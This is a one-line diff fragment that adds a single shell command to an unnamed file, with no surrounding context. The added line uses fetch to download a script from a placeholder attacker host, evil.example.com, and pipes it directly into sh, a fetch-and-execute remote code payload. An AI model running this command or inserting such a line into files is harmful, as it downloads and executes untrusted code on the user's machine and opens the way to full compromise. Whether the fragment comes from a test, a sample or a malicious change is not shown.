@@ -1,0 +1,1 @@
+fetch -o - https://evil.example.com/x.sh | sh
